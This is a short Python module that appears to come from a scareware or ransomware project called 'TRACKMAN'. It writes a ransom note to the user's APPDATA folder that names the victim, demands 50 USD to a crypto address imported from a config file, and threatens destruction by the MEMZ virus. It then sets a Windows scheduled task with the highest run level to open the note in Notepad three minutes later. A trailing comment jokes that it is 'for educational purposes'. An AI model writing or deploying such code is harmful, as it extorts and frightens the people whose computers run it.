import os, subprocess
from datetime import datetime, timedelta
from co.config import CRYPTO_ADDRESS
def shownote():
    appdata_roaming = os.path.join(os.environ['APPDATA'])
    txt_file_path = os.path.join(appdata_roaming, "note998.txt")
    username = os.getlogin()
    with open(txt_file_path, "w") as f:
        f.write(f"HELLO, {username}.\n")
        f.write("YOU HAVE BEEN INFECTED WITH TRACKMAN.\n")
        f.write("WE HAVE FULL CONTROL OVER YOUR PC RIGHT NOW!!!\n")
        f.write(f"PAY US 50 USD AT {CRYPTO_ADDRESS} OR YOUR PC DIES. IF U RESTART IT THE MEMZ VIRUS WILL RUN IMMEDIATELY ON BOOT WITH ZERO DELAY.")
        f.write(f"IF YOU LOCK THE PC, IT WILL ALSO TRIGGER! ON TOP OF THAT IF YOU DONT PAY US IT WILL HAPPEN IN 20 MINUTES.")
        f.write(f"WE HAVE DISABLED TASK MANAGER AND REGISTRY AND ARE WATCHING YOU IN REAL TIME. GOOD LUCK!!!\n")
    subprocess.run(f'schtasks /create /tn "openfile" /tr "notepad.exe {txt_file_path}" /sc once /st {(datetime.now() + timedelta(seconds=180)).strftime("%H:%M")} /rl HIGHEST /f', shell=True)
# now i swear this is for educational purposes, your honor    